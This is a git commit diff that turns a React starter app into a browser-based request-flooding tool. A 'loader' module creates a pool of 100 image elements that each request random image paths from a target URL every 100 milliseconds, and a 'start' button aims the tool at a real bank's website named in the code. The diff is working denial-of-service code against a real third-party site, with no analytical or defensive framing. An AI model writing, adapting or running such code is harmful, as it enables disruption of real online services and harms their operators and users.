ab476fe7d2393fa94a5112c54a5b77561794c915
Adrian Romanko <romankoadrian@gmail.com>
2022-02-28 01:36:48 -0500

    loader

--- src/App.tsx
+++ src/App.tsx
@@ -1,24 +1,25 @@
-import React from 'react';
-import logo from './logo.svg';
+import React, { useEffect } from 'react';
 import './App.css';
+import { WorkerPool } from './loader';
+
+const pool = new WorkerPool(100);
 
 function App() {
+  const runJob = async () => {
+    pool.process('https://www.gazprombank.ru');
+  };
+
+  useEffect(() => {
+    // runJob();
+  }, []);
+
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.tsx</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+    <div className='App'>
+      <section>
+        <button type='button' onClick={() => runJob()}>
+          start
+        </button>
+      </section>
     </div>
   );
 }
---
+++ src/loader.ts
@@ -0,0 +1,46 @@
+const generate = (num: number) => Math.random().toString(36).slice(num);
+
+export const run = (img: HTMLImageElement, url: string) => {
+  return new Promise((resolve, reject) => {
+    img.src = `${url}/${generate(2)}/${generate(2)}.png`;
+    img.onload = () => {
+      resolve(0);
+    };
+    img.onerror = () => {
+      resolve(0);
+    };
+  });
+};
+
+export class WorkerPool {
+  size = 0;
+  pool: HTMLImageElement[] = [];
+  jobs: any[] = [];
+  constructor(size: number) {
+    this.size = size || 4;
+    this.pool = [];
+    this.jobs = [];
+    this.fillPool();
+  }
+
+  fillPool = () => {
+    for (var i = 0; i < this.size; i++) {
+      const id = generate(2);
+      const img = document.createElement('img');
+      document.getElementById('body')?.appendChild(img);
+      this.pool.push(img);
+    }
+  };
+
+  process(url: string) {
+    this.pool.forEach((thread) => {
+      this.next(thread, url);
+    });
+  }
+
+  next(thread: HTMLImageElement, url: string) {
+    run(thread, url).then((res) =>
+      setTimeout(() => this.next(thread, url), 100)
+    );
+  }
+}
